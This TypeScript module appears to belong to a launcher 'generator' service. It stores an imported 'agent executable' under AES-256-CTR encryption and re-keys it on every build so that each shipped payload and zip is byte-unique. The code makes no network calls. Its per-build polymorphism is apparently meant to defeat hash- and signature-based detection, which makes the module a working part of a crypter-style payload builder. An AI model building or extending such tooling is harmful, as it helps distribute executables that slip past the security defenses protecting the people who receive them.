/**
 * Payload cache (launcher mode): the agent executable is imported ONCE and
 * stored pre-encrypted under a master key. Nothing is fetched at request
 * time; every build RE-KEYS the cached bytes under a fresh per-build key so
 * the shipped ciphertext (and therefore the final zip) is byte-unique.
 *
 * Storage layout (generator/payload-cache/, gitignored):
 *   master.key   — 64-hex AES-256 master key (created at first use when
 *                  PAYLOAD_MASTER_KEY is not set), chmod 0600
 *   meta.json    — { sha256, size, iv, sourceName, importedAt }
 *   payload.bin  — AES-256-CTR(master, iv, <agent exe bytes>)
 *
 * The plaintext exe exists only in memory after import (and only on the
 * operator drop or the one-time authed upload). Per-job temps live under
 * jobs/{jobId}/ and are removed by storage.cleanupJob on expiry.
 */

import * as crypto from "crypto";
import * as fs from "fs";
import * as path from "path";

const CACHE_DIR = path.join(__dirname, "..", "payload-cache");
const META_FILE = path.join(CACHE_DIR, "meta.json");
const BLOB_FILE = path.join(CACHE_DIR, "payload.bin");
const KEY_FILE  = path.join(CACHE_DIR, "master.key");

const MAX_PAYLOAD_BYTES = 500 * 1024 * 1024; // 500 MB hard cap

export interface PayloadMeta {
  sha256: string;
  size: number;
  iv: string;          // hex, 16 bytes
  sourceName: string;
  importedAt: string;
}

function ctr(key: Buffer, iv: Buffer, data: Buffer): Buffer {
  const c = crypto.createCipheriv("aes-256-ctr", key, iv);
  return Buffer.concat([c.update(data), c.final()]);
}

function sha256Hex(data: Buffer): string {
  return crypto.createHash("sha256").update(data).digest("hex");
}

let masterKeyCache: Buffer | null = null;

function masterKey(): Buffer {
  if (masterKeyCache) return masterKeyCache;
  const envKey = process.env.PAYLOAD_MASTER_KEY ?? "";
  if (envKey.trim() !== "") {
    const k = Buffer.from(envKey.trim(), "hex");
    if (k.length !== 32) {
      throw new Error("PAYLOAD_MASTER_KEY must be 64 hex chars (32 bytes)");
    }
    masterKeyCache = k;
    return k;
  }
  fs.mkdirSync(CACHE_DIR, { recursive: true });
  if (fs.existsSync(KEY_FILE)) {
    const k = Buffer.from(fs.readFileSync(KEY_FILE, "utf8").trim(), "hex");
    if (k.length !== 32) {
      throw new Error("stored payload master key is corrupt (needs 32 bytes)");
    }
    masterKeyCache = k;
    return k;
  }
  const k = crypto.randomBytes(32);
  fs.writeFileSync(KEY_FILE, `${Buffer.from(k).toString("hex")}\n`, {
    mode: 0o600,
  });
  masterKeyCache = k;
  return k;
}

function readMeta(): PayloadMeta | null {
  try {
    if (!fs.existsSync(META_FILE)) return null;
    return JSON.parse(fs.readFileSync(META_FILE, "utf8")) as PayloadMeta;
  } catch {
    return null;
  }
}

/** True when a payload was imported and the encrypted blob is on disk. */
export function isImported(): boolean {
  return fs.existsSync(META_FILE) && fs.existsSync(BLOB_FILE);
}

/** One-time import from an in-memory buffer (POST /payload). */
export function importFromBuffer(data: Buffer, sourceName: string): PayloadMeta {
  if (data.length === 0) throw new Error("payload is empty");
  if (data.length > MAX_PAYLOAD_BYTES) {
    throw new Error(
      `payload too large: ${data.length} bytes (max ${MAX_PAYLOAD_BYTES})`
    );
  }
  const meta = readMeta();
  const sha256 = sha256Hex(data);
  if (meta && meta.sha256 === sha256 && meta.size === data.length) {
    return meta; // idempotent re-import of the identical artifact
  }
  fs.mkdirSync(CACHE_DIR, { recursive: true });
  const iv = crypto.randomBytes(16);
  const blob = ctr(masterKey(), iv, data);
  fs.writeFileSync(BLOB_FILE, blob);
  const fresh: PayloadMeta = {
    sha256,
    size: data.length,
    iv: Buffer.from(iv).toString("hex"),
    sourceName,
    importedAt: new Date().toISOString(),
  };
  fs.writeFileSync(META_FILE, JSON.stringify(fresh, null, 2));
  return fresh;
}

/** Import from PAYLOAD_PATH (operator drop on the VPS), one-time. */
export function importFromPath(
  sourcePath: string,
  sourceName?: string
): PayloadMeta {
  if (!fs.existsSync(sourcePath)) {
    throw new Error(`PAYLOAD_PATH does not exist: ${sourcePath}`);
  }
  const st = fs.statSync(sourcePath);
  if (st.size > MAX_PAYLOAD_BYTES) {
    throw new Error(
      `payload too large: ${st.size} bytes (max ${MAX_PAYLOAD_BYTES})`
    );
  }
  return importFromBuffer(
    fs.readFileSync(sourcePath),
    sourceName ?? path.basename(sourcePath)
  );
}

/** Autoload on first launcher build when PAYLOAD_PATH is configured. */
export function ensureImported(): PayloadMeta {
  if (isImported()) return readMeta() as PayloadMeta;
  const src = process.env.PAYLOAD_PATH ?? "";
  if (src.trim() !== "") return importFromPath(src.trim());
  throw new Error(
    "No cached payload: import one via POST /payload, or set PAYLOAD_PATH " +
      "and restart. The launcher mode never fetches the agent at request time " +
      "(offline contract)."
  );
}

export function status(): { imported: boolean; meta: PayloadMeta | null } {
  return { imported: isImported(), meta: readMeta() };
}

/**
 * Decryption of the cached blob — the ONLY caller may be the per-build stamp
 * step, which immediately re-keys the bytes with a fresh key/IV. Raw bytes
 * are never persisted to the job dir.
 */
export function getPayloadBytes(): Buffer {
  const meta = ensureImported();
  if (!fs.existsSync(BLOB_FILE)) throw new Error("payload blob missing on disk");
  const blob = fs.readFileSync(BLOB_FILE);
  const iv = Buffer.from(meta.iv, "hex");
  const plain = ctr(masterKey(), iv, blob);
  if (plain.length !== meta.size) {
    throw new Error("payload size mismatch after decrypt — cache corrupt");
  }
  if (sha256Hex(plain) !== meta.sha256) {
    throw new Error("payload SHA-256 mismatch after decrypt — cache corrupt");
  }
  return plain;
}

/**
 * Re-key: one AES-256-CTR pass under a FRESH key+IV (pure CPU, ~ms). The
 * caller decides key/IV (per-build random); the returned ciphertext is
 * byte-unique even for identical uploaded payloads.
 */
export function reKey(data: Buffer, key: Buffer, iv: Buffer): Buffer {
  if (key.length !== 32) throw new Error("re-key requires a 32-byte key");
  if (iv.length !== 16) throw new Error("re-key requires a 16-byte IV");
  return ctr(key, iv, data);
}